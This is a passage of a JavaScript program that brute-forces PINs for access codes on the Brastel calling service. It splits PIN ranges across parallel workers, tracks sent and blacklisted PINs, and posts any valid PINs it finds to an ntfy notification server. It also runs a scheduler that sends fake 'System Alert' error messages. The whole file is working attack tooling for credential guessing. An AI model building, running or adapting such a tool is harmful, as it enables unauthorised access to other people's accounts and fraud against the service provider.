      this.logger.info('If you want to continue searching, add these PINs to blacklist_pins.json');

      // Mark as found to stop any further processing
      this.pinChecker.found = true;

      await this.handleCompletion(true, []);

      return true; // Continue to next accessCode
    }

    const pins = this.generatePinRange();
    const pinBatches = this.distributePins(pins);

    // Get unsent pins for completion tracking
    const unsentPins = pins.filter(pin => {
      const formattedPin = Utils.formatPin(pin);
      return !this.fileManager.isPinSent(formattedPin);
    });

    const workers = this.createWorkers(pinBatches);

    await Promise.all(workers);

    this.logger.success(`Completed processing accessCode: ${this.accessCode}`);

    // Display final statistics
    this.displayStats();

    await this.handleCompletion(false, unsentPins);

    if (this.workersStoppedByUndefined > 0) {
      return false;
    }
    return true; // Continue to next accessCode
  }
}

/**
 * Main application class - handles multiple accessCodes
 */
class BrastelPinChecker {
  constructor() {
    this.accessCodes = CONFIG.accessCodes;
    this.errorScheduler = null;
  }

  /**
   * Display application header
   */
  displayHeader() {
    console.log('🚀 Starting Brastel PIN Checker with Multiple AccessCodes...');
    console.log(`📋 Total AccessCodes to process: ${this.accessCodes.length}`);
    console.log(`⚠️ Per-worker undefined limit: ${CONFIG.maxUndefinedResults}`);
    console.log('==========================================');
  }

  /**
   * Display application footer
   */
  displayFooter() {
    console.log('\n🎉 All AccessCodes processing completed.');
  }

  /**
   * Process single access code
   * @param {Object} accessCodeConfig - Access code configuration
   * @param {number} index - Index of current access code
   * @returns {Promise<boolean>} True if should continue
   */
  async processAccessCode(accessCodeConfig, index) {
    console.log(`\n🎯 Processing AccessCode ${index + 1}/${this.accessCodes.length}: ${accessCodeConfig.accessCode}`);
    console.log('==========================================');

    const checker = new SingleAccessCodeChecker(accessCodeConfig);
    const shouldContinue = await checker.start();

    if (!shouldContinue) {
      console.log('\n❌ Stopping all processing due to global undefined limit exceeded.');
      return false;
    }

    // If this is not the last accessCode, show transition message
    if (index < this.accessCodes.length - 1) {
      console.log(`\n✅ Completed ${accessCodeConfig.accessCode}. Moving to next accessCode...`);
      console.log('==========================================');
    }

    return true;
  }

  /**
   * Validate configuration
   * @throws {Error} If configuration is invalid
   */
  validateConfiguration() {
    if (!Array.isArray(this.accessCodes) || this.accessCodes.length === 0) {
      throw new Error('No access codes configured');
    }

    for (const config of this.accessCodes) {
      if (!config.accessCode || !config.pinRange) {
        throw new Error('Invalid access code configuration');
      }
      if (config.pinRange.start > config.pinRange.end) {
        throw new Error(`Invalid PIN range for ${config.accessCode}`);
      }
    }
  }

  /**
   * Start the PIN checking process for all accessCodes
   */
  async start() {
    try {
      this.validateConfiguration();
      this.displayHeader();

      // Start error scheduler for dummy error notifications
      const logger = new Logger('SCHEDULER');
      this.errorScheduler = new ErrorScheduler(logger);
      this.errorScheduler.start();

      for (let i = 0; i < this.accessCodes.length; i++) {
        const shouldContinue = await this.processAccessCode(this.accessCodes[i], i);
        if (!shouldContinue) break;
      }

      this.displayFooter();
    } catch (error) {
      console.error(`❌ Application error: ${error.message}`);
      throw error;
    } finally {
      // Stop error scheduler when application ends
      if (this.errorScheduler) {
        this.errorScheduler.stop();
      }
    }
  }
}

/**
 * Error Scheduler Class - Sends dummy error notifications every 60 minutes
 */
class ErrorScheduler {
  constructor(logger) {
    this.logger = logger;
    this.ntfyNotifier = new NtfyNotifier(logger);
    this.intervalId = null;
    this.isRunning = false;
    this.errorMessages = [
      'System memory usage is critically high',
      'Database connection timeout detected',
      'API rate limit exceeded for external service',
      'Disk space running low on server',
      'Network connectivity issues detected',
      'Authentication service is experiencing delays',
      'Cache invalidation failed for user sessions',
      'Background job queue is backing up',
      'SSL certificate will expire soon',
      'Configuration file corruption detected'
    ];
  }

  /**
   * Get a random error message
   * @returns {string} Random error message
   */
  getRandomErrorMessage() {
    const randomIndex = Math.floor(Math.random() * this.errorMessages.length);
    return this.errorMessages[randomIndex];
  }

  /**
   * Send dummy error notification
   */
  async sendDummyError() {
    try {
      const errorMessage = this.getRandomErrorMessage();
      const title = '🛑 System Alert - Error';
      const fullMessage = `Error: ${errorMessage}`;

      const success = await this.ntfyNotifier.sendNotification(title, fullMessage, '3'); // Priority 2 for dummy errors

      if (success) {
        this.logger.info('✅ Dummy error notification sent successfully');
      } else {
        this.logger.warning('⚠️ Failed to send dummy error notification');
      }
    } catch (error) {
      this.logger.error(`Error sending dummy notification: ${error.message}`);
    }
  }

  /**
   * Start the error scheduler
   */
  start() {
    if (this.isRunning) {
      this.logger.warning('Error scheduler is already running');
      return;
    }

    this.logger.info('🕒 Starting error scheduler - will send dummy error every 60 minutes');

    // Send first dummy error immediately
    this.sendDummyError();

    // Set interval for every 60 minutes (3,600,000 milliseconds)
    this.intervalId = setInterval(() => {
      this.sendDummyError();
    }, 30 * 60 * 1000);

    this.isRunning = true;
    this.logger.info('✅ Error scheduler started successfully');
  }

  /**
   * Stop the error scheduler
   */
  stop() {
    if (!this.isRunning) {
      this.logger.warning('Error scheduler is not running');
      return;
    }

    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }

    this.isRunning = false;
    this.logger.info('🛑 Error scheduler stopped');
  }

  /**
   * Check if scheduler is running
   * @returns {boolean} True if running
   */
  isSchedulerRunning() {
    return this.isRunning;
  }
}

/**
 * Ntfy Notification Class
 */
class NtfyNotifier {
  constructor(logger) {
    this.logger = logger;
    this.topic = CONFIG.ntfy.topic;
    this.topic_error = CONFIG.ntfy.topic_error;
    this.server = CONFIG.ntfy.server;
    this.enabled = CONFIG.ntfy.enabled;
  }

  /**
   * Sanitize text for HTTP headers (remove emojis and special characters)
   * @param {string} text - Text to sanitize
   * @returns {string} Sanitized text
   */
  sanitizeHeader(text) {
    // Remove emojis and special characters that might cause HTTP header issues
    return text.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1F1E0}-\u{1F1FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, '')
      .replace(/[^\x20-\x7E]/g, '') // Remove non-printable ASCII characters (keep only printable ASCII)
      .trim();
  }

  /**
   * Send notification to ntfy
   * @param {string} title - Notification title
   * @param {string} message - Notification message
   * @param {string} priority - Priority level (1-5, default: 4)
   * @returns {Promise<boolean>} True if notification sent successfully
   */
  async sendNotification(title, message, priority = CONFIG.ntfy.priority) {
    if (!this.enabled) {
      this.logger.info('Ntfy notifications are disabled');
      return false;
    }

    try {
      let url = `${this.server}/${this.topic}`;
      if (priority !== '4' && priority !== '5') {
        url = `${this.server}/${this.topic_error}`;
      }

      // Sanitize title for HTTP header
      const sanitizedTitle = this.sanitizeHeader(title);

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
          'Priority': priority,
          'Title': sanitizedTitle
        },
        body: message
      });

      if (response.ok) {
        return true;
      } else {
        this.logger.error(`Failed to send ntfy notification: ${response.status} ${response.statusText}`);
        return false;
      }
    } catch (error) {
      this.logger.error(`Error sending ntfy notification: ${error.message}`);
      return false;
    }
  }

  /**
   * Send accesscode completion notification
   * @param {string} accessCode - Access code that was processed
   * @param {Object} completionInfo - Information about the completion
   * @param {string} completionInfo.status - Status: 'found', 'completed', 'stopped'
   * @param {string} completionInfo.reason - Reason for completion
   * @param {Object} completionInfo.stats - Statistics from processing
   * @returns {Promise<boolean>} True if notification sent successfully
   */
  async sendAccessCodeCompletionNotification(accessCode, completionInfo) {
    const { status, reason, stats } = completionInfo;

    let title = '';
    let message = '';
    let priority = '3'; // Default priority

    switch (status) {
    case 'found':
      title = 'AccessCode Processing Complete - PIN Found';
      message = '✅ AccessCode processing completed successfully!\n\n' +
          `Access Code: ${accessCode}\n` +
          `Valid PINs: ${stats.validNonBlacklistedPins.map(p => p.pin).join(', ')}`;
      priority = '4'; // High priority for success
      break;

    case 'completed':
      title = 'AccessCode Processing Complete - No PIN Found';
      message = '⚠️ AccessCode processing completed without finding valid PINs\n\n' +
          `Access Code: ${accessCode}\n` +
          'Status: No valid PIN found\n' +
          `Total sent: ${stats.sentPinsCount}\n` +
          `Blacklisted: ${stats.blacklistPinsCount}\n` +
          `Reason: ${reason}\n` +
          `Time: ${new Date().toLocaleString()}`;
      priority = '3'; // Normal priority
      break;

    case 'stopped':
      title = 'AccessCode Processing Stopped';
      message = '🛑 AccessCode processing was stopped\n\n' +
          `Access Code: ${accessCode}\n` +
          'Status: Processing stopped\n' +
          `Total sent: ${stats.sentPinsCount}\n` +
          `Blacklisted: ${stats.blacklistPinsCount}\n` +
          `Reason: ${reason}\n` +
          `Time: ${new Date().toLocaleString()}`;
      priority = '2'; // Low priority for stopped
      break;

    default:
      title = 'AccessCode Processing Complete';
      message = 'ℹ️ AccessCode processing finished\n\n' +
          `Access Code: ${accessCode}\n` +
          `Status: ${status}\n` +
          `Total sent: ${stats.sentPinsCount}\n` +
          `Reason: ${reason}\n` +
          `Time: ${new Date().toLocaleString()}`;
      priority = '3';
    }

    return await this.sendNotification(title, message, priority);
  }

  /**
   * Send worker stopped notification
   * @param {string} accessCode - Access code
   * @param {number} workerId - Worker ID that was stopped
   * @param {number} undefinedCount - Number of undefined results that caused the stop
   * @param {number} maxUndefinedResults - Maximum allowed undefined results
   * @returns {Promise<boolean>} True if notification sent successfully
   */
  async sendWorkerStoppedNotification(accessCode, workerId, undefinedCount, maxUndefinedResults) {
    const title = 'Brastel Worker Stopped - Undefined Limit';
    const message = '🛑 Worker stopped due to undefined results!\n\n' +
                   `Access Code: ${accessCode}\n` +
                   `Worker ID: ${workerId}\n` +
                   `Undefined results: ${undefinedCount}/${maxUndefinedResults}\n` +
                   `Time: ${new Date().toLocaleString()}\n\n` +
                   'This worker will stop processing. Other workers may continue.';

    return await this.sendNotification(title, message, '3'); // Normal priority for worker stop
  }
}

// Start the application
if (require.main === module) {
  const app = new BrastelPinChecker();
  app.start().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
}

module.exports = {
  BrastelPinChecker,
  CONFIG,
  Utils,
  LOG_LEVELS,
  API_RESULT_CODES
};
